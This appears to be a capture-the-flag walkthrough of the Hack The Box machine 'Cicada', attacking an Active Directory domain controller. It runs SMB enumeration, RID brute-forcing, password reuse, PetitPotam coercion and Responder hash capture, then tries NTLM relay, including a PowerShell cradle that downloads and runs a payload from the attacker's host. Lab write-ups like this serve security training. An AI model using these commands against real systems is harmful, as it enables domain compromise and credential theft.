
```
┌──(root㉿kali)-[~/htb/Cicada]
└─# nmap -p- --open -Pn 10.10.11.35
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-29 22:18 EDT
Stats: 0:05:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 67.77% done; ETC: 22:26 (0:02:45 remaining)
Nmap scan report for 10.10.11.35
Host is up (0.22s latency).
Not shown: 65522 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
52702/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 521.49 seconds

```

```
echo "10.10.11.35 CICADA-DC.cicada.htb" >> /etc/hosts
echo "10.10.11.35 cicada.htb" >> /etc/hosts
```

有两个盘不是常规的：DEV，HR
```
┌──(root㉿kali)-[~/htb/Cicada]
└─# smbclient --no-pass -L //10.10.11.35

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

dev没权限
```
┌──(root㉿kali)-[~/htb/Cicada]
└─# smbclient --no-pass //10.10.11.35/DEV
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

```

HR有个txt，可以下载下来
```
┌──(root㉿kali)-[~/htb/Cicada]
└─# smbclient --no-pass //10.10.11.35/HR
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 323205 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
smb: \> 

```

txt,得到一个密码，但是不知道用户名：```Cicada$M6Corpb*@Lp#nZp!8```
```
┌──(root㉿kali)-[~/htb/Cicada]
└─# cat 'Notice from HR.txt' 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```


使用<guest:空密码>爆破出用户名
```
┌──(root㉿kali)-[~/htb/Cicada]
└─# crackmapexec smb 10.10.11.35 -d cicada.htb -u guest -p '' --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [+] Brute forcing RIDs
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```


验证用户
```
┌──(root㉿kali)-[~/htb/Cicada]
└─# crackmapexec smb 10.10.11.35 -d cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 


┌──(root㉿kali)-[~/htb/Cicada]
└─# crackmapexec smb 10.10.11.35 -d cicada.htb -u 'Dev Support' -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\Dev Support:Cicada$M6Corpb*@Lp#nZp!8 
```



使用nxc枚举漏洞
```
┌──(root㉿kali)-[~]
└─# nxc smb 10.10.11.35  -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -M petitpotam
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
PETITPOTAM  10.10.11.35     445    CICADA-DC        VULNERABLE
PETITPOTAM  10.10.11.35     445    CICADA-DC        Next step: https://github.com/topotam/PetitPotam

```


触发
```
──(root㉿kali)-[~/htb/Cicada/PetitPotam]
└─# python3 PetitPotam.py -d xie.com -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.16.5 10.10.11.35

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:10.10.11.35[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```


responder接收
```
responder -I tun0 

[SMB] NTLMv2-SSP Client   : 10.10.11.35
[SMB] NTLMv2-SSP Username : CICADA\CICADA-DC$
[SMB] NTLMv2-SSP Hash     : CICADA-DC$::CICADA:0105599891c2123a:94C34C79B00E4FB968892A828938F3B5:010100000000000000FB46F0F612DB01FE711BA295FA654E0000000002000800530047005200540001001E00570049004E002D00460059004C004800330037004C00440035003900330004003400570049004E002D00460059004C004800330037004C0044003500390033002E0053004700520054002E004C004F00430041004C000300140053004700520054002E004C004F00430041004C000500140053004700520054002E004C004F00430041004C000700080000FB46F0F612DB0106000400020000000800300030000000000000000000000000400000F536D8B079BB1B82337A1EE06E77A78B45E962130F7C1506C7D985C1794D95C00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0035000000000000000000

```

这个哈希好像破口不了

john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt


python3 /root/osep/challeng5/env/bin/ntlmrelayx.py --remove-mic --escalate-user hack -t smb://10.10.11.35 -smb2support --no-http-server --no-wcf-server




python3 /root/osep/challeng5/env/bin/ntlmrelayx.py --remove-mic -t smb://10.10.11.35 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.16.5:80/b\")"'



python3 /root/windowns-privilege/impacket/examples/ntlmrelayx.py  -t smb://10.10.11.35 -smb2support


ntlmrelayx.py -t http://<FQDN-ADCS>/certsrv -smb2support --adcs --template DomainController


nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'  -M petitpotam

nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -x whoami

python3 /root/osep/challeng5/env/bin/ntlmrelayx.py --escalate-user michael.wrightson --remove-mic  -t smb://10.10.11.35  -smb2support --no-http-server --no-wcf-server


python3 /root/osep/challeng5/env/bin/ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://10.10.11.35 -smb2support

python3 /root/osep/challeng5/env/bin/ntlmrelayx.py --remove-mic -t smb://10.10.11.35 -smb2support --no-http-server --no-wcf-server


python3 PetitPotam.py -d xie.com -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.16.5 10.10.11.35
